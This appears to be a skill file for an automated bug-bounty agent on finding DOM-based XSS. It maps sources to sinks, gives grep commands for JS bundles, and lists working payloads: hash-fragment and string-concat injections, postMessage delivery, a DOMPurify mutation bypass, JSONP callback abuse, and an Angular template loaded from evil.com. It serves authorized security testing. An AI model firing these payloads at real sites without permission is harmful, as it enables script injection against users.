---
name: attack-xss-dom
description: "DOM XSS — sink/source mapping (innerHTML, eval, postMessage, location.*), client-side taint tracing, DOMPurify/mXSS notes"
category: "client-side"
version: "1.0"
author: "bountyreper-official"
tags:
  - xss
  - dom
  - sinks
  - postmessage
  - taint
tech_stack:
  - web
cwe_ids:
  - CWE-79
chains_with:
  - attack-xss
  - attack-open-redirect
prerequisites:
  - attack-xss
---

# DOM XSS

## Objective

Server response can be perfectly encoded and the bug still exists: the value reaches a
dangerous JS sink client-side. Payload never appears "reflected" in the useful sense —
it lives in `location.*`, storage, postMessage, or JSON that JS re-renders.

## Methodology

### 1. Source → sink map (what to grep in shipped JS)

Sources (attacker-controlled without a request):
`location.hash`, `location.search`, `location.pathname`, `document.referrer`,
`window.name`, `postMessage` `e.data`, WebSQL/IndexDB locals, JSONP parameters.

Sinks (execute or build HTML/JS):
`innerHTML`/`outerHTML`/`insertAdjacentHTML`, `document.write`/`writeln`,
`eval`/`Function`/`setInterval`("string"), `setTimeout`("string"),
`element.src`/`href`/`action`, `jQuery .html()/.append()/$()`,
`document.location`/`domain`, `innerHTML` via Angular (`ng-html`, trusted `$sce`).

```bash
# Fast static pass over bundles
cat app.js | grep -oE "innerHTML|document\.write|eval\(|Function\(|postMessage" | sort | uniq -c
# Trace one sink back to its source
cat app.js | grep -B5 "innerHTML" | head -40
```

### 2. Trigger mechanics — payloads that never show in HTML

```text
https://target/page#<img src=x onerror=alert(1)>     (hash-based sink)
https://target/page#default='+alert(1)+'              (string-concat sink)
https://target/page#default=<svg onload=alert(1)>     (jquery .html(hash))
iframe.postMessage: window.frames[0].postMessage("<img src=x onerror=alert(1)>","*")
postMessage wildcard: listener does e.data → innerHTML without origin check
```

Verification needs a REAL browser run (hackbrowser) — hash payloads are invisible to
curl. Capture console + DOM mutation.

### 3. Framework hard routes (the ones that pay)

| App behavior | What it usually means | Attack route |
|---|---|---|
| Angular `templateUrl` from URL fragment | remote template load | fragment → `\\evil.com\\tpl.html` with `ng-include` payload |
| `trustedTypes` / DOMPurify present | input to innerHTML is cleaned | hunt mXSS: `<svg></p><style><!--</style><img src=x onerror=alert(1)>` mutation |
| jQuery `.html(location.hash...)` seen | classic jQuery sink | test all 4 hash-delimiters (' " < >) variants |
| JSONP callback from URL param | response is JS | `callback=alert(1)//` |
| `postMessage` any origin listener | need popup/frame delivery | craft opener page on your own host |

### 4. Open-redirect into DOM XSS

`location = urlParam` or `location.href = fragment` sinks: chain with attack-open-redirect
when the sink writes to a JS-consuming location (`document.baseURI`, sandbox iframe src).

### 5. Proving

- headless run shows the alert/console.error from payload — screenshot + DOM dump
- postMessage delivery: host a one-page opener, record execution trace
- iff sink sanitizes: capture the EXACT bypass mutation that shipped

## Notes

- grep-based source tracing misses dynamic flows; fall back to running the app and
  hooking `Element.prototype.innerHTML = wasm` style devtools breakpoints in hackbrowser
- prefer `onerror`/`onload` styles over `onmouseenter` for bots — no interaction needed
